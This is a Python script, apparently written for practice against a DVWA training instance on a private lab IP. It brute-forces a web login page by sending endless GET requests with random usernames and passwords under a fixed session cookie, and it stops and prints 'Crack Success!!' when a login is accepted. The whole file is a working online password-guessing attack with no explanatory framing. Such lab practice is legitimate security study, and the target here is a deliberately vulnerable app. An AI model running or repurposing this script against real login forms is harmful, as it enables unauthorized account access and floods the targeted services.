import requests
import string
import random
import datetime

print(datetime.datetime.now())
letters = string.ascii_letters+string.digits#+string.punctuation)

while(1):
    username=''
    password=''
    for len1 in range(5):
        username += random.choice(str(letters))
    for len2 in range(8):
        password += random.choice(str(letters))

    URL="http://10.0.2.13:8080/vulnerabilities/brute/?username="+str(username)+"&password="+str(password)+"&Login=Login" 

    cookie={ 
        "PHPSESSID":"4d4v36d8eindghvkdmct5oenb4",
        "security":"low"
        }

    session1=requests.Session()

    req=session1.get(URL,cookies=cookie)

    if(req.text.find("password incorrect")==-1):
        index=req.text.find("Welcome")    
        print("\n\n") 
        print("Crack Success!!"+str(username)+"/"+str(password))
        print("\n\n")
        print(datetime.datetime.now())
        exit(0)
    else:
        print("Wrong username/password:"+str(username)+"/"+str(password))
